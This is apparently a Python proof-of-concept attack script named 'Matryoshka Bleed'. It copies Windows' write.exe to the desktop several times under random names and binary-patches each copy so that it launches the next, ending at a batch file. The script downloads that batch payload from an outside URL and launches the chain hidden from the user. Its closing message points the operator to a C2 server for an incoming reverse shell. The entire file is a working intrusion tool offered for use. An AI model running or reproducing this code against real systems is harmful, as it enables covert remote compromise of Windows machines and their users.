#!/usr/bin/env python3
# Matryoshka Bleed - POC Client
# LEPAD (Legacy Parameter Descent) Implementation
# GitHub: https://github.com/Sshhxd/Matryoshka-Bleed

import os
import shutil
import random
import string
import subprocess
import requests

# ========== CONFIGURATION ==========
DESKTOP = os.path.join(os.path.expanduser("~"), "Desktop")
SOURCE = r"C:\Windows\System32\write.exe"
DOLL_COUNT = 4
PAYLOAD_URL = "https://pixelvault.co/mt5hq/direct"
BAT_FILENAME = "InnocentUpdater.bat"

# ========== PATTERN FOR write.exe ==========
# "wordpad.exe" in UTF-16 little endian
SEARCH_PATTERN = bytes([
    0x77, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x64, 0x00,
    0x70, 0x00, 0x61, 0x00, 0x64, 0x00, 0x2E, 0x00,
    0x65, 0x00, 0x78, 0x00, 0x65, 0x00
])

# ========== FUNCTIONS ==========
def name_to_bytes(name):
    """Convert string to UTF-16 little endian bytes"""
    result = []
    for char in name:
        result.append(ord(char))
        result.append(0x00)
    return bytes(result)

def replace_string(file_path, new_target):
    """Patch write.exe binary - replace 'wordpad.exe' with new target"""
    target_bytes = name_to_bytes(new_target)
    replacement = bytearray(target_bytes)
    
    # Pad with null bytes if needed
    while len(replacement) < len(SEARCH_PATTERN):
        replacement.append(0x00)
    
    # Read binary
    with open(file_path, "rb") as f:
        data = f.read()
    
    # Find "wordpad.exe" in the binary
    offset = data.find(SEARCH_PATTERN)
    if offset < 0:
        return False
    
    # Replace the string
    data = bytearray(data)
    for j in range(len(replacement)):
        if offset + j < len(data):
            data[offset + j] = replacement[j]
    
    # Write back
    with open(file_path, "wb") as f:
        f.write(data)
    return True

# ========== DEPLOYMENT ==========
print("[+] Matryoshka Bleed - Deploying LEPAD chain")
print(f"[+] Target directory: {DESKTOP}")

# Create patched copies (dolls)
print(f"[+] Creating {DOLL_COUNT} patched copies...")
dolls = [''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))) + ".exe" for _ in range(DOLL_COUNT)]
for doll in dolls:
    shutil.copy2(SOURCE, os.path.join(DESKTOP, doll))
    print(f"    Created: {doll}")

# Chain dolls - each points to the next
print("[+] Building execution chain...")
for i in range(DOLL_COUNT - 1):
    replace_string(os.path.join(DESKTOP, dolls[i]), dolls[i+1])
    print(f"    {dolls[i]} → {dolls[i+1]}")

# Last doll points to the bat file
print("[+] Configuring final target...")
replace_string(os.path.join(DESKTOP, dolls[-1]), BAT_FILENAME)
print(f"    {dolls[-1]} → {BAT_FILENAME}")

# Download payload (bat file)
print(f"[+] Downloading payload from {PAYLOAD_URL}")
try:
    r = requests.get(PAYLOAD_URL, timeout=10)
    with open(os.path.join(DESKTOP, BAT_FILENAME), "wb") as f:
        f.write(r.content)
    print("[+] Payload downloaded successfully")
except Exception as e:
    print(f"[-] Download failed: {e}")

# Start chain - NO WINDOWS VISIBLE
print("[+] Launching chain (stealth mode)...")
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
startupinfo.wShowWindow = subprocess.SW_HIDE

os.chdir(DESKTOP)
subprocess.Popen(dolls[0], shell=True, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)

print("[+] Deployment complete!")
print("[+] Check your C2 server for incoming reverse shell")